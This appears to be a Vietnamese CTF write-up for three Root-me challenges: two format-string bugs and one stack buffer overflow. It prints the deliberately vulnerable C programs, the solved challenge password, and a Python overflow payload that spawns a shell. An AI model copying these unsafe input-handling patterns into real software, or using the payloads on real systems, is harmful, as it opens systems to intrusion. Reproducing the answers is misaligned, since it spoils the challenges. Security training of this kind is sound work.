# Root me (pwn)

## ELF x86 - Format string bug basic 1

```c
#include <stdio.h>
#include <unistd.h>
 
int main(int argc, char *argv[]){
        FILE *secret = fopen("/challenge/app-systeme/ch5/.passwd", "rt");
        char buffer[32];
        fgets(buffer, sizeof(buffer), secret);
        printf(argv[1]);
        fclose(secret);
        return 0;
}
```

Bài này là format string nên bug sẽ nằm ở hàm printf ta test thử nhập vào %p xem chương trình sẽ in ra tham số như thế nào

<figure><img src=".gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

Decode output từ hex ta sẽ được password

&#x20;

<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

9apD()6dmapE

## ELF x86 - Format string bug basic 2

```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
 
int main( int argc, char ** argv )
 
{
 
        int var;
        int check  = 0x04030201;
 
        char fmt[128];
 
        if (argc <2)
                exit(0);
 
        memset( fmt, 0, sizeof(fmt) );
 
        printf( "check at 0x%x\n", &check );
        printf( "argv[1] = [%s]\n", argv[1] );
 
        snprintf( fmt, sizeof(fmt), argv[1] );
 
        if ((check != 0x04030201) && (check != 0xdeadbeef))    
                printf ("\nYou are on the right way !\n");
 
        printf( "fmt=[%s]\n", fmt );
        printf( "check=0x%x\n", check );
 
        if (check==0xdeadbeef)
        {
                printf("Yeah dude ! You win !\n");
                setreuid(geteuid(), geteuid());
                system("/bin/bash");
        }
}
```

## ELF x86 - Stack buffer overflow basic 1

```c
#include <unistd.h>
#include <sys/types.h>
#include <stdlib.h>
#include <stdio.h>
 
int main()
{
 
  int var;
  int check = 0x04030201;
  char buf[40];
 
  fgets(buf,45,stdin);
 
  printf("\n[buf]: %s\n", buf);
  printf("[check] %p\n", check);
 
  if ((check != 0x04030201) && (check != 0xdeadbeef))
    printf ("\nYou are on the right way!\n");
 
  if (check == 0xdeadbeef)
   {
     printf("Yeah dude! You win!\nOpening your shell...\n");
     setreuid(geteuid(), geteuid());
     system("/bin/bash");
     printf("Shell closed! Bye.\n");
   }
   return 0;
}
```

Easy buffer overflow bug sẽ nằm ở  [fgets](http://www.opengroup.org/onlinepubs/009695399/functions/fgets.html)(buf,45,stdin); vì chương trình chỉ cho nhập 40 ký tự nhưng ở đây lại cho 45 nên ta sẽ ghi đè lên nó để đọc shell&#x20;

payload : ./ch13 | (python -c  'print "A" \* 40  + "\xef\xbe\xad\xde"'; cat)

Dùng cat để giữ shell

